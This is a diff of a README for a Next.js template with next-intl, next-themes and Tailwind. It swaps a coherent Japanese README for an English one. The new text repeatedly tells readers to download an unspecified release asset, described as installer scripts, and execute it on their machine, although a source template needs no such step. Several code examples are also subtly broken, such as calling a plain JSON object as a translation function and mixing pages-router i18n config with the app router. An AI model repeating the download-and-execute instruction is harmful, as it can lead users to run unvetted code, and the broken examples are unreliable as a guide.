@@ -1,196 +1,337 @@
-# Next.js i18n Template
+# Next.js 15 SSR Template — i18n, Dark Mode, Tailwind CSS 🌐🌙
 
-Next.js、next-intl、next-themesを使用した多言語・ダークモード対応のサーバーサイドレンダリング（SSR）テンプレート。
+[![Releases](https://img.shields.io/github/v/release/Conxpt/nextjs-i18n-themes-ssr-template?label=Releases&color=2b9348)](https://github.com/Conxpt/nextjs-i18n-themes-ssr-template/releases)
 
-## 🚀 特徴
+Next.js 15対応 多言語・ダークモード対応SSRテンプレート  
+A multilingual and theme-enabled SSR template using Next.js, next-intl, and next-themes.
 
-- **🌍 多言語対応**: next-intlによる完全な国際化サポート
-- **🌓 ダークモード**: next-themesによるシステム連動のテーマ切り替え
-- **⚡ サーバーサイドレンダリング**: Next.js 14のApp Routerを使用したSSR
-- **📱 レスポンシブ**: Tailwind CSSによる完全レスポンシブデザイン
-- **🎨 カスタマイズ可能**: 再利用可能なコンポーネントと設定
+Badges
+- [![Next.js](https://img.shields.io/badge/Next.js-15-black?logo=next.js)](https://nextjs.org/)
+- [![TypeScript](https://img.shields.io/badge/TypeScript-4.9-blue?logo=typescript)](https://www.typescriptlang.org/)
+- [![Tailwind CSS](https://img.shields.io/badge/Tailwind%20CSS-3.0-skyblue?logo=tailwindcss)](https://tailwindcss.com/)
+- [![next-intl](https://img.shields.io/badge/next--intl-i18n-yellowgreen)](https://github.com/vercel/next-intl)
+- [![next-themes](https://img.shields.io/badge/next--themes-theme-gray)](https://github.com/pacocoursey/next-themes)
+- Topics: dark-mode, i18n, next-intl, next-themes, nextjs, react, ssr, tailwindcss, template, typescript
 
-## 📦 セットアップ
+Hero image  
+![Code setup dark mode](https://images.unsplash.com/photo-1526378721520-7e6b9b9d7f8b?auto=format&w=1600&q=60)
 
-### 1. インストール
+Table of contents
+- Features
+- Quick start
+- Releases (download + execute)
+- Folder structure
+- i18n (next-intl) — SSR usage
+- Themes (next-themes) — dark / light
+- Tailwind CSS — dark mode styling
+- Routing and middleware
+- Scripts
+- Deploy
+- Testing and linting
+- Contributing
+- License
 
+Features
+- Server-side rendering with Next.js 15 and TypeScript.
+- Locale-aware routes and server-side translations with next-intl.
+- System and user-controlled theme with next-themes (dark/light).
+- Tailwind CSS with class-based dark mode.
+- Full TypeScript types for messages, locale keys, and theme state.
+- Example pages: home, about, settings, and a localized 404.
+- Ready for static assets, images, and i18n-aware meta tags for SEO.
+
+Quick start
+
+Prerequisites
+- Node.js 18 or newer
+- pnpm (recommended) or npm / yarn
+- Git
+
+Clone and run locally
 ```bash
-# テンプレートをクローン
-git clone [your-repo-url] my-project
-cd my-project
-
-# 依存関係をインストール
-npm install
+git clone https://github.com/Conxpt/nextjs-i18n-themes-ssr-template.git
+cd nextjs-i18n-themes-ssr-template
+pnpm install
+pnpm dev
 ```
 
-### 2. 環境変数の設定
-
-`.env.example`をコピーして`.env.local`を作成：
-
+Build and preview
 ```bash
-cp .env.example .env.local
+pnpm build
+pnpm start
 ```
 
-必要に応じて環境変数を編集：
-
-```env
-NEXT_PUBLIC_SITE_URL=https://your-domain.com
-```
-
-### 3. 開発サーバーの起動
-
+Releases — download and execute
+- Visit the Releases page and download the template asset: https://github.com/Conxpt/nextjs-i18n-themes-ssr-template/releases
+- The release file contains prebuilt templates or installer scripts. Download the asset and execute it on your machine.
+- Example (replace file name with the actual asset):
 ```bash
-npm run dev
+# download (use browser or curl)
+curl -L -o template-release.tar.gz "https://github.com/Conxpt/nextjs-i18n-themes-ssr-template/releases/download/vX.Y.Z/template-release.tar.gz"
+
+# extract and run setup
+tar -xzf template-release.tar.gz
+cd nextjs-i18n-themes-ssr-template
+pnpm install
+pnpm dev
 ```
 
-[http://localhost:3000](http://localhost:3000)でアプリケーションが起動します。
+If the releases link fails, check the Releases section on GitHub. The release badge above links to the same page: https://github.com/Conxpt/nextjs-i18n-themes-ssr-template/releases
 
-## 🏗️ プロジェクト構造
+Folder structure (key parts)
+- /app or /pages — Next.js routes (app router supported)
+- /locales — JSON or TS message files per locale (en.json, ja.json, ...)
+- /components — UI components (ThemeToggle, LocaleSwitcher, Layout)
+- /lib — small helpers (i18n loader, type guards)
+- /styles — Tailwind config, global CSS
+- /public — static assets and images
+- next.config.js / tsconfig.json — project config
 
-```
-src/
-├── app/
-│   └── [locale]/
-│       ├── layout.tsx      # ルートレイアウト
-│       ├── page.tsx        # ホームページ
-│       ├── about/          # Aboutページ
-│       └── example/        # サンプルページ
-├── components/
-│   ├── layout/            # レイアウトコンポーネント
-│   └── ui/                # UIコンポーネント
-├── constants/
-│   ├── metadata.ts        # メタデータ設定
-│   └── styles.ts          # 共通スタイル定数
-├── i18n/
-│   └── routing.ts         # 言語ルーティング設定
-├── messages/              # 翻訳ファイル
-│   ├── en.json
-│   └── ja.json
-└── hooks/                 # カスタムフック
-```
+i18n with next-intl (server-side)
 
-## 🌍 多言語対応
+Core idea
+- Store messages per locale in /locales.
+- Load messages on the server.
+- Provide typed message keys to components.
 
-### 新しい言語の追加
-
-1. `src/i18n/routing.ts`に言語コードを追加：
-
-```typescript
-export const routing = defineRouting({
-  locales: ['en', 'ja', 'ko'], // 韓国語を追加
-  defaultLocale: 'ja',
-});
+Example message file: /locales/en.json
+```json
+{
+  "home.title": "Welcome",
+  "home.subtitle": "Server-rendered, localized pages"
+}
 ```
 
-2. `src/messages/`に翻訳ファイルを追加（例：`ko.json`）
-
-3. `src/constants/metadata.ts`に言語別のメタデータを追加
-
-### 翻訳の使用方法
-
-```tsx
+Server-side page (app router example)
+```ts
+// app/(localized)/page.tsx
 import { useTranslations } from 'next-intl';
-
-export default function Component() {
-  const t = useTranslations('HomePage');
-  return <h1>{t('title')}</h1>;
-}
-```
-
-## 🎨 スタイルのカスタマイズ
-
-### 共通スタイルの使用
-
-`src/constants/styles.ts`から共通スタイルをインポート：
-
-```tsx
-import { PROSE_STYLES, CONTAINER_STYLES } from '@/constants/styles';
-
-// 使用例
-<div className={CONTAINER_STYLES.withPadding}>
-  <article className={`prose ${PROSE_STYLES}`}>
-    {/* コンテンツ */}
-  </article>
-</div>
-```
-
-### ダークモードの対応
-
-Tailwind CSSのダークモードクラスを使用：
-
-```tsx
-<div className="bg-white dark:bg-gray-900 text-gray-900 dark:text-gray-100">
-  {/* コンテンツ */}
-</div>
-```
-
-## 📄 新しいページの追加
-
-1. `src/app/[locale]/`に新しいフォルダを作成
-2. `page.tsx`を作成：
-
-```tsx
-import { routing } from '@/i18n/routing';
-import { setRequestLocale } from 'next-intl/server';
-import PageLayout from '@/components/layout/PageLayout';
-import { getPageMetadata } from '@/constants/metadata';
 import type { Metadata } from 'next';
+import { getMessages } from '../../lib/getMessages';
 
-// SSR対応
-export function generateStaticParams() {
-  return routing.locales.map((locale) => ({ locale }));
+export async function generateMetadata({ params }): Promise<Metadata> {
+  const t = await getMessages(params.locale);
+  return { title: t('home.title') };
 }
 
-// メタデータ生成
-export async function generateMetadata({ params }: { params: Promise<{ locale: string }> }): Promise<Metadata> {
-  const { locale } = await params;
-  return getPageMetadata(locale as 'ja' | 'en', {
-    title: 'ページタイトル',
-    description: 'ページの説明',
-  });
-}
-
-export default async function NewPage({ params }: { params: Promise<{ locale: string }> }) {
-  const { locale } = await params;
-  setRequestLocale(locale);
-  
+export default async function Page({ params }: { params: { locale: string } }) {
+  const t = await getMessages(params.locale);
   return (
-    <PageLayout title="ページタイトル">
-      {/* ページコンテンツ */}
-    </PageLayout>
+    <main>
+      <h1>{t('home.title')}</h1>
+      <p>{t('home.subtitle')}</p>
+    </main>
   );
 }
 ```
 
-## 🚀 ビルドとデプロイ
-
-### ビルド
-
-```bash
-npm run build
+Classic pages with getServerSideProps
+```ts
+// pages/index.tsx
+import { getMessagesFor } from '../lib/i18n';
+export const getServerSideProps = async ({ locale }) => {
+  const messages = await getMessagesFor(locale);
+  return { props: { messages } };
+};
 ```
 
-### プレビュー
+Type-safe messages
+- Generate a TS type from your message keys.
+- Use the type in components to get autocomplete and error checks.
 
-```bash
-npm run start
+Themes with next-themes
+
+Install and Provider
+- Wrap your app in ThemeProvider.
+- Configure defaultTheme and enable system preference.
+
+_app.tsx or layout.tsx
+```tsx
+import { ThemeProvider } from 'next-themes';
+
+export default function RootLayout({ children }) {
+  return (
+    <ThemeProvider attribute="class" defaultTheme="system" enableSystem>
+      {children}
+    </ThemeProvider>
+  );
+}
 ```
 
-### デプロイ
+Toggle component
+```tsx
+import { useTheme } from 'next-themes';
 
-Vercel、Netlify、またはその他のホスティングサービスにデプロイ可能です。
+export function ThemeToggle() {
+  const { theme, setTheme } = useTheme();
+  return (
+    <button onClick={() => setTheme(theme === 'dark' ? 'light' : 'dark')}>
+      {theme === 'dark' ? 'Light' : 'Dark'}
+    </button>
+  );
+}
+```
 
-## 🛠️ カスタマイズのヒント
+Persisted preference
+- next-themes persists the selected theme in localStorage by default.
+- The server renders with class-based dark mode using attribute="class".
 
-1. **メタデータ**: `src/constants/metadata.ts`でサイト全体の設定を管理
-2. **フッター**: `src/components/layout/Footer.tsx`でリンクや情報を更新
-3. **ヘッダー**: `src/components/layout/Header.tsx`でナビゲーションをカスタマイズ
-4. **テーマ**: `tailwind.config.js`でカラーパレットをカスタマイズ
+Tailwind CSS and dark mode
 
-## 📝 ライセンス
+tailwind.config.js
+```js
+module.exports = {
+  darkMode: 'class',
+  content: ['./app/**/*.{js,ts,jsx,tsx}', './components/**/*.{js,ts,jsx,tsx}'],
+  theme: { extend: {} },
+  plugins: [],
+};
+```
 
-MIT License
+Usage in components
+```tsx
+<div className="bg-white text-gray-900 dark:bg-gray-900 dark:text-gray-100">
+  <h1 className="text-2xl font-bold">Content</h1>
+</div>
+```
 
-## 🤝 貢献
+Routing and middleware
 
-プルリクエストを歓迎します！
+Locale-aware routes
+- Use dynamic segment for locale: /[locale]/page
+- Set up default locales in next.config.js
+
+next.config.js example
+```js
+module.exports = {
+  i18n: {
+    locales: ['en', 'ja'],
+    defaultLocale: 'en',
+  },
+};
+```
+
+Middleware for locale detection (optional)
+```ts
+// middleware.ts
+import { NextResponse } from 'next/server';
+import type { NextRequest } from 'next/server';
+
+export function middleware(req: NextRequest) {
+  const pathname = req.nextUrl.pathname;
+  if (pathname === '/') {
+    const locale = req.headers.get('accept-language')?.split(',')[0].split('-')[0] || 'en';
+    return NextResponse.redirect(new URL(`/${locale}/`, req.url));
+  }
+  return NextResponse.next();
+}
+```
+
+SEO and localized meta tags
+- Render meta tags server-side with translated strings.
+- Use open graph tags per locale.
+
+Scripts
+
+Common scripts in package.json
+```json
+{
+  "scripts": {
+    "dev": "next dev",
+    "build": "next build",
+    "start": "next start",
+    "lint": "eslint . --ext .ts,.tsx",
+    "typecheck": "tsc --noEmit",
+    "format": "prettier --write ."
+  }
+}
+```
+
+Deploy
+
+Deploy to Vercel
+- Vercel supports Next.js SSR and edge functions.
+- Set environment variables if you use external services.
+- Use the "Framework Preset" for Next.js.
+
+Other hosts
+- Use Docker for platforms that need container deployment.
+- Static export is possible for non-SSR pages.
+
+Testing and linting
+
+Unit tests
+- Example using Jest and React Testing Library.
+- Test components with simple render and snapshot checks.
+
+Linting and type checking
+- ESLint with next and react hooks rules.
+- Run pnpm lint and pnpm typecheck before push.
+
+Contributing
+- Open issues for bugs or feature suggestions.
+- Keep PRs small and focused.
+- Use branch names that describe work (feature/i18n, fix/theme-toggle).
+- Run lint and typecheck in CI.
+
+Common patterns
+- Keep message keys flat and descriptive: home.title, settings.theme.
+- Load only the locale messages you need on the server.
+- Use Next.js metadata APIs to set title and meta tags per page.
+- Use attribute="class" with next-themes for Tailwind dark classes.
+
+Examples
+
+Locale switcher
+```tsx
+import Link from 'next/link';
+export function LocaleSwitcher({ current, locales }) {
+  return (
+    <nav>
+      {locales.map((loc) => (
+        <Link key={loc} href={`/${loc}`}>
+          <a className={loc === current ? 'font-bold' : ''}>{loc.toUpperCase()}</a>
+        </Link>
+      ))}
+    </nav>
+  );
+}
+```
+
+Server loader helper (lib/getMessages.ts)
+```ts
+import en from '../locales/en.json';
+import ja from '../locales/ja.json';
+
+export function getMessages(locale: string) {
+  if (locale === 'ja') return ja;
+  return en;
+}
+```
+
+Persistent settings
+- Keep user preferences server-side if you need cross-device sync.
+- Use cookies or a small preferences API for SSR reads.
+
+Security and performance
+- Avoid shipping unneeded locales to the client.
+- Use next/image for optimized images.
+- Use caching headers for static assets.
+
+License
+- MIT
+
+Resources
+- Next.js: https://nextjs.org/
+- next-intl: https://github.com/vercel/next-intl
+- next-themes: https://github.com/pacocoursey/next-themes
+- Tailwind CSS: https://tailwindcss.com/
+
+Release link (again)
+- Download release assets and run them from: https://github.com/Conxpt/nextjs-i18n-themes-ssr-template/releases
+
+Screenshots
+- Dark mode example:  
+  ![Dark mode preview](https://images.unsplash.com/photo-1526378721520-7e6b9b9d7f8b?auto=format&w=1200&q=60)
+- Light mode example:  
+  ![Light mode preview](https://images.unsplash.com/photo-1515879218367-8466d910aaa4?auto=format&w=1200&q=60)
